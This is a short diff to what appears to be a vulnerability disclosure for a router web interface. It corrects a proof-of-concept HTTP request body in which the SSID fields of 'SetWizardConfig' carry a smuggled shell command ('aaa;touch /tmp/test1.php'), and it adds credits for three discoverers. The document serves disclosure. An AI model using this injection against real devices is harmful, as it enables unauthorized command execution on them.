@@ -68,5 +68,13 @@ DNT: 1
 X-Forwarded-For: 8.8.8.8
 Connection: close
 
-{"SetWizardConfig":{"wl(1).(0)_ssid":"aaa;touch /tmp/test1.phpp","wl(0).(0)_ssid":"aaa;touch /tmp/test2.php"}}
+{"SetWizardConfig":{"wl(1).(0)_ssid":"aaa;touch /tmp/test1.php","wl(0).(0)_ssid":"aaa;touch /tmp/test2.php"}}
 ```
+#### Acknowledgement
+Thanks to the partners who discovered the vulnerability together：
+
+Wei Xie
+
+Zhen-hua Wang
+
+En-Ze Wang
